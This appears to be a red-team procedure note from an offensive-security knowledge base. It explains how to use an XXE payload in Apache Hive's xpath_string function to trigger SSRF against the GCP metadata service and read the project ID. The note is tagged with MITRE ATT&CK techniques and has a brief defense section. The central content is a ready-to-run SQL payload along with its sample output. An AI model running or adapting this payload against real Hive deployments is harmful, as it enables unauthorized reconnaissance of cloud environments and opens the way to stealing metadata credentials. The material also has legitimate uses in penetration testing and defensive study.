---
id: uuid-3
tags:
  - xxe
  - ssrf
  - gcp
  - metadata
type: procedure
tools:
  - '[[tools/Hive-JDBC]]'
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
commands:
  - '[[commands/hive-xxe-fetch-project-id]]'
verified: false
platforms:
  - GCP
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T04:08:55.632Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[System Information Discovery]]'
---
# Execute-XXE-to-Fetch-GCP-Project-ID

## Summary

This procedure injects an XXE payload into the Hive xpath_string function to trigger SSRF, fetching the GCP project ID from the internal metadata service, confirming access to cloud context.

## Description

The xpath_string function in Apache Hive processes XML without external entity restrictions, allowing SSRF to http://metadata.google.internal. The payload defines an entity pointing to the project ID endpoint, resolved during XML parsing on the server.

## Requirements

1. Active connection to Hive database
2. Knowledge of GCP metadata endpoints
3. A table like 'test' for query execution

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers (e.g., via Hive config)
- Network segmentation to block metadata access from app servers
- Monitor SQL queries for XML injection patterns

## Objectives

1. Perform SSRF via XXE
2. Retrieve project identifier
3. Validate internal network reachability

## Instructions

### Step 1: Inject XXE Payload

**Context**: Craft and execute SQL using xpath_string to resolve the external entity.

**Command** ([[commands/hive-xxe-fetch-project-id]]):
```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

> The DOCTYPE defines the xxe entity as the metadata URL; &xxe; inclusion triggers the HTTP request. Output: 'en-development'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Discovery]] Discovery

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[System Information Discovery]] System Information Discovery

### Sub-Techniques


## Commands Used

- [[commands/hive-xxe-fetch-project-id]]

## Tools Used

- [[tools/Hive-JDBC]]

## Tags

- [[xxe]]
- [[ssrf]]
- [[gcp]]
- [[metadata]]
